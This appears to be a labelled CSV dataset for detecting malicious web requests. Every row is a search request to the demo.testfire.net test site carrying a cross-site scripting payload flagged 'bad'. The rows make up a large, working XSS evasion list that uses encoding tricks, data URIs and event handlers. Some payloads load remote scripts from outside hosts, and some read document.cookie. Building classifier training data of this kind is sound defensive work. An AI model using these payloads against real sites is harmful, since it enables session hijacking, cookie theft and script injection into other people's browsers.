path,content,host,class_flag
/search.jsp?query=<img src ?itworksonchrome?\/onerror = alert(1),,demo.testfire.net,['bad']
/search.jsp?query=<svg><script>//&NewLine;confirm(1);</script </svg>,,demo.testfire.net,['bad']
/search.jsp?query=<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,,demo.testfire.net,['bad']
/search.jsp?query=<svg><script onlypossibleinopera:-)> alert(1),,demo.testfire.net,['bad']
/search.jsp?query=<script x> alert(1) </script 1=2,,demo.testfire.net,['bad']
"/search.jsp?query=<div/onmouseover='alert(1)'> style=""x:"">",,demo.testfire.net,['bad']
/search.jsp?query=<--`<img/src=` onerror=alert(1)> --!>,,demo.testfire.net,['bad']
"/search.jsp?query=<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",,demo.testfire.net,['bad']
"/search.jsp?query=<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",,demo.testfire.net,['bad']
"/search.jsp?query=""><img src=x onerror=window.open('https://www.google.com/');>",,demo.testfire.net,['bad']
/search.jsp?query=<form><button formaction=javascript&colon;alert(1)>CLICKME,,demo.testfire.net,['bad']
"/search.jsp?query=<math><a xlink:href=""//jsfiddle.net/t846h/"">click",,demo.testfire.net,['bad']
"/search.jsp?query=<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",,demo.testfire.net,['bad']
"/search.jsp?query=<iframe src=""data:text/html,<script>alert(1)</script>""></iframe>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",,demo.testfire.net,['bad']
/search.jsp?query=; alert(1);,,demo.testfire.net,['bad']
/search.jsp?query=)alert(1);//,,demo.testfire.net,['bad']
/search.jsp?query=<ScRiPt>alert(1)</sCriPt>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=jAVasCrIPt:alert(XSS)>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=javascript:alert(XSS);>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=javascript:alert(&quot;XSS&quot;)>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=javascript:alert(XSS)>      ,,demo.testfire.net,['bad']
/search.jsp?query=<img src=xss onerror=alert(1)>,,demo.testfire.net,['bad']
"/search.jsp?query=<iframe   src=""&Tab;javascript:prompt(1)&Tab;"" >",,demo.testfire.net,['bad']
/search.jsp?query=<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',,demo.testfire.net,['bad']
"/search.jsp?query=<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",,demo.testfire.net,['bad']
/search.jsp?query=<sVg><scRipt  >alert&lpar;1&rpar; {Opera},,demo.testfire.net,['bad']
/search.jsp?query=<img/src=` ` onerror=this.onerror=confirm(1),,demo.testfire.net,['bad']
"/search.jsp?query=<form><isindex formaction=""javascript&colon;confirm(1)""",,demo.testfire.net,['bad']
/search.jsp?query=<img src=` `&NewLine; onerror=alert(1)&NewLine;,,demo.testfire.net,['bad']
/search.jsp?query=<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,,demo.testfire.net,['bad']
/search.jsp?query=<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,,demo.testfire.net,['bad']
"/search.jsp?query=<iframe/src=""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="">",,demo.testfire.net,['bad']
/search.jsp?query=<script /* */>/* */alert(1)/* */</script /* */,,demo.testfire.net,['bad']
/search.jsp?query=&#34;&#62;<h1/onmouseover='\u0061lert(1)'> ,,demo.testfire.net,['bad']
"/search.jsp?query=<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",,demo.testfire.net,['bad']
"/search.jsp?query=<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",,demo.testfire.net,['bad']
"/search.jsp?query=<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",,demo.testfire.net,['bad']
/search.jsp?query=<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera},,demo.testfire.net,['bad']
"/search.jsp?query=<meta http-equiv=""refresh"" content=""0;url=javascript:confirm(1)"">",,demo.testfire.net,['bad']
/search.jsp?query=<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,,demo.testfire.net,['bad']
"/search.jsp?query=<form><a href=""javascript:\u0061lert&#x28;1&#x29;"">X",,demo.testfire.net,['bad']
"/search.jsp?query=</script><img/* /src=""worksinchrome&colon;prompt&#x28;1&#x29;""/ */onerror='eval(src)'>",,demo.testfire.net,['bad']
/search.jsp?query=<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,,demo.testfire.net,['bad']
"/search.jsp?query=<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",,demo.testfire.net,['bad']
/search.jsp?query=http://www.google<script .com>alert(document.location)</script,,demo.testfire.net,['bad']
"/search.jsp?query=<a&#32;href&#61;&#91;&#00;&#93;""&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"">XYZ</a",,demo.testfire.net,['bad']
/search.jsp?query=<img/src=@&#32;&#13; onerror = prompt('&#49;'),,demo.testfire.net,['bad']
/search.jsp?query=<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;,,demo.testfire.net,['bad']
/search.jsp?query=<script ^__^>alert(String.fromCharCode(49))</script ^__^,,demo.testfire.net,['bad']
/search.jsp?query=</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(,,demo.testfire.net,['bad']
"/search.jsp?query=&#00;</form><input type&#61;""date"" onfocus=""alert(1)"">",,demo.testfire.net,['bad']
/search.jsp?query=<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>,,demo.testfire.net,['bad']
/search.jsp?query=<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,,demo.testfire.net,['bad']
/search.jsp?query=<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",,demo.testfire.net,['bad']
/search.jsp?query=<script ~~~>alert(0%0)</script ~~~>,,demo.testfire.net,['bad']
/search.jsp?query=<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>,,demo.testfire.net,['bad']
/search.jsp?query=<///style///><span / onmousemove='alert&lpar;1&rpar;'>SPAN,,demo.testfire.net,['bad']
/search.jsp?query=<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),,demo.testfire.net,['bad']
/search.jsp?query=&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',,demo.testfire.net,['bad']
/search.jsp?query=&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera},,demo.testfire.net,['bad']
/search.jsp?query=<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^,,demo.testfire.net,['bad']
"/search.jsp?query=<div/style=""width:expression(confirm(1))"">X</div> {IE7}",,demo.testfire.net,['bad']
/search.jsp?query=<iframe/ / src=javaSCRIPT&colon;alert(1),,demo.testfire.net,['bad']
/search.jsp?query=//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,,demo.testfire.net,['bad']
"/search.jsp?query=/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",,demo.testfire.net,['bad']
/search.jsp?query=//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\,,demo.testfire.net,['bad']
/search.jsp?query=</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,,demo.testfire.net,['bad']
"/search.jsp?query=<a/href=""javascript:&#13; javascript:prompt(1)""><input type=""X"">",,demo.testfire.net,['bad']
/search.jsp?query=</plaintext\></|\><plaintext/onmouseover=prompt(1),,demo.testfire.net,['bad']
/search.jsp?query=</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera},,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""javascript&colon;\u0061&#x6C;&#101rt&lpar;1&rpar;""><button>",,demo.testfire.net,['bad']
/search.jsp?query=<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,,demo.testfire.net,['bad']
"/search.jsp?query=<iframe style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",,demo.testfire.net,['bad']
"/search.jsp?query=<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",,demo.testfire.net,['bad']
"/search.jsp?query=<var onmouseover=""prompt(1)"">On Mouse Over</var>",,demo.testfire.net,['bad']
/search.jsp?query=<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,,demo.testfire.net,['bad']
"/search.jsp?query=<img src=""/"" =_="" title=""onerror='prompt(1)'"">",,demo.testfire.net,['bad']
/search.jsp?query=<%<!--'%><script>alert(1);</script -->,,demo.testfire.net,['bad']
"/search.jsp?query=<script src=""data:text/javascript,alert(1)""></script>",,demo.testfire.net,['bad']
/search.jsp?query=<iframe/src \/\/onload = prompt(1),,demo.testfire.net,['bad']
/search.jsp?query=<iframe/onreadystatechange=alert(1),,demo.testfire.net,['bad']
/search.jsp?query=<svg/onload=alert(1),,demo.testfire.net,['bad']
/search.jsp?query=<input value=<><iframe/src=javascript:confirm(1),,demo.testfire.net,['bad']
"/search.jsp?query=<input type=""text"" value=`` <div/onmouseover='alert(1)'>X</div>",,demo.testfire.net,['bad']
/search.jsp?query=http://www.<script>alert(1)</script .com,,demo.testfire.net,['bad']
/search.jsp?query=<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;)></iframe>,,demo.testfire.net,['bad']
/search.jsp?query=<svg><script ?>alert(1),,demo.testfire.net,['bad']
/search.jsp?query=<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(&Tab;1&Tab;)></iframe>,,demo.testfire.net,['bad']
/search.jsp?query=<img src=`xx:xx`onerror=alert(1)>,,demo.testfire.net,['bad']
"/search.jsp?query=<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>",,demo.testfire.net,['bad']
"/search.jsp?query=<math><a xlink:href=""//jsfiddle.net/t846h/"">click",,demo.testfire.net,['bad']
"/search.jsp?query=<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>",,demo.testfire.net,['bad']
/search.jsp?query=<svg contentScriptType=text/vbs><script>MsgBox+1,,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101rt(1)>"">X</a",,demo.testfire.net,['bad']
/search.jsp?query=<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,,demo.testfire.net,['bad']
/search.jsp?query=<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,,demo.testfire.net,['bad']
"/search.jsp?query=<script/src=""data&colon;text/j\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=/",,demo.testfire.net,['bad']
"/search.jsp?query=<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061lert(/XSS/)></script",,demo.testfire.net,['bad']
/search.jsp?query=<object data=javascript&colon;\u0061&#x6C;&#101rt(1)>,,demo.testfire.net,['bad']
/search.jsp?query=<script>+-+-1-+-+alert(1)</script>,,demo.testfire.net,['bad']
/search.jsp?query=<body/onload=&lt;!--&gt;&#10alert(1)>,,demo.testfire.net,['bad']
/search.jsp?query=<script itworksinallbrowsers>/*<script* */alert(1)</script,,demo.testfire.net,['bad']
/search.jsp?query=<img src ?itworksonchrome?\/onerror = alert(1),,demo.testfire.net,['bad']
/search.jsp?query=<svg><script>//&NewLine;confirm(1);</script </svg>,,demo.testfire.net,['bad']
/search.jsp?query=<svg><script onlypossibleinopera:-)> alert(1),,demo.testfire.net,['bad']
/search.jsp?query=<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,,demo.testfire.net,['bad']
/search.jsp?query=<script x> alert(1) </script 1=2,,demo.testfire.net,['bad']
"/search.jsp?query=<div/onmouseover='alert(1)'> style=""x:"">",,demo.testfire.net,['bad']
/search.jsp?query=<--`<img/src=` onerror=alert(1)> --!>,,demo.testfire.net,['bad']
"/search.jsp?query= <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",,demo.testfire.net,['bad']
"/search.jsp?query=<div style=""xg-p:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>",,demo.testfire.net,['bad']
"/search.jsp?query=""><img src=x onerror=window.open('https://www.google.com/');>",,demo.testfire.net,['bad']
/search.jsp?query=<form><button formaction=javascript&colon;alert(1)>CLICKME,,demo.testfire.net,['bad']
"/search.jsp?query=<math><a xlink:href=""//jsfiddle.net/t846h/"">click",,demo.testfire.net,['bad']
"/search.jsp?query=<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",,demo.testfire.net,['bad']
"/search.jsp?query=<iframe src=""data:text/html,<script>alert(1)</script>""></iframe>",,demo.testfire.net,['bad']
"/search.jsp?query=<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=;alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//></SCRIPT>>><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",,demo.testfire.net,['bad']
/search.jsp?query=<IMG ><SCRIPT>alert(XSS)</SCRIPT>>,,demo.testfire.net,['bad']
"/search.jsp?query=<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=jav ascript:alert(XSS);>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=jav&#x09;ascript:alert(XSS);>,,demo.testfire.net,['bad']
/search.jsp?query=<<SCRIPT>alert(XSS);//<</SCRIPT>,,demo.testfire.net,['bad']
/search.jsp?query=%3cscript%3ealert(1)%3c/script%3e,,demo.testfire.net,['bad']
/search.jsp?query=><s+cript>alert(document.cookie)</script>,,demo.testfire.net,['bad']
/search.jsp?query=foo<script>alert(1)</script>,,demo.testfire.net,['bad']
/search.jsp?query=<scr<script>ipt>alert(1)</scr</script>ipt>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,,demo.testfire.net,['bad']
/search.jsp?query=<BODY BACKGROUND=javascript:alert(XSS)>,,demo.testfire.net,['bad']
/search.jsp?query=<BODY ONLOAD=alert(XSS)>,,demo.testfire.net,['bad']
/search.jsp?query=<INPUT TYPE=IMAGE SRC=javascript:alert(XSS);>,,demo.testfire.net,['bad']
/search.jsp?query=<IMG SRC=javascript:alert(XSS),,demo.testfire.net,['bad']
/search.jsp?query=<iframe src=http://ha.ckers.org/scriptlet.html <,,demo.testfire.net,['bad']
"/search.jsp?query=javascript:alert(""hellox worldss"")",,demo.testfire.net,['bad']
"/search.jsp?query=<img src=""javascript:alert('XSS');"">",,demo.testfire.net,['bad']
/search.jsp?query=<img src=javascript:alert(&quot;XSS&quot;)>,,demo.testfire.net,['bad']
"/search.jsp?query=<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",,demo.testfire.net,['bad']
"/search.jsp?query=<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",,demo.testfire.net,['bad']
"/search.jsp?query=<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<<SCRIPT>alert(""XSS"");//<</SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=<""';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",,demo.testfire.net,['bad']
"/search.jsp?query=';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search",,demo.testfire.net,['bad']
"/search.jsp?query=<script>alert(""hellox worldss"")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510",,demo.testfire.net,['bad']
"/search.jsp?query=<script>alert(""XSS"");</script>&search=1",,demo.testfire.net,['bad']
"/search.jsp?query=0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//"";alert(String.fromCharCode?(88,83,83))//\"";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search",,demo.testfire.net,['bad']
/search.jsp?query=<h1><font color=blue>hellox worldss</h1>,,demo.testfire.net,['bad']
/search.jsp?query=<BODY ONLOAD=alert('hellox worldss')>,,demo.testfire.net,['bad']
/search.jsp?query=<input onfocus=write(XSS) autofocus>,,demo.testfire.net,['bad']
/search.jsp?query=<input onblur=write(XSS) autofocus><input autofocus>,,demo.testfire.net,['bad']
/search.jsp?query=<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,,demo.testfire.net,['bad']
"/search.jsp?query=<form><button formaction=""javascript:alert(XSS)"">lol",,demo.testfire.net,['bad']
"/search.jsp?query=<!--<img src=""--><img src=x onerror=alert(XSS)//"">",,demo.testfire.net,['bad']
"/search.jsp?query=<![><img src=""]><img src=x onerror=alert(XSS)//"">",,demo.testfire.net,['bad']
"/search.jsp?query=<style><img src=""</style><img src=x onerror=alert(XSS)//"">",,demo.testfire.net,['bad']
"/search.jsp?query=<? foo=""><script>alert(1)</script>"">",,demo.testfire.net,['bad']
"/search.jsp?query=<! foo=""><script>alert(1)</script>"">",,demo.testfire.net,['bad']
"/search.jsp?query=</ foo=""><script>alert(1)</script>"">",,demo.testfire.net,['bad']
"/search.jsp?query=<? foo=""><x foo='?><script>alert(1)</script>'>"">",,demo.testfire.net,['bad']
"/search.jsp?query=<! foo=""[[[Inception]]""><x foo=""]foo><script>alert(1)</script>"">",,demo.testfire.net,['bad']
"/search.jsp?query=<% foo><x foo=""%><script>alert(123)</script>"">",,demo.testfire.net,['bad']
"/search.jsp?query=<div style=""font-family:'foo&#10;;color:red;';"">LOL",,demo.testfire.net,['bad']
"/search.jsp?query=LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>",,demo.testfire.net,['bad']
/search.jsp?query=<script>({0:#0=alert/#0#/#0#(0)})</script>,,demo.testfire.net,['bad']
"/search.jsp?query=<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(123)</script></svg>",,demo.testfire.net,['bad']
/search.jsp?query=&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;,,demo.testfire.net,['bad']
"/search.jsp?query=\\"";alert('XSS');//",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\""XSS\"");&lt;/SCRIPT&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;INPUT TYPE=\""IMAGE\"" SRC=\""javascript&#058;alert('XSS');\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;BODY ONLOAD=alert('XSS')&gt;,,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG DYNSRC=\""javascript&#058;alert('XSS')\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;IMG LOWSRC=\""javascript&#058;alert('XSS')\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;BGSOUND SRC=\""javascript&#058;alert('XSS');\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;BR SIZE=\""&{alert('XSS')}\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;LAYER SRC=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/LAYER&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058;alert('XSS');\""&gt;",,demo.testfire.net,['bad']
"/search.jsp?query=&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;",,demo.testfire.net,['bad']
/search.jsp?query=&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;,,demo.testfire.net,['bad']
"/search.jsp?query=&lt;META HTTP-EQUIV=\""Link\"" Content=\""&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\""&gt;",,demo.testfire.net,['bad']
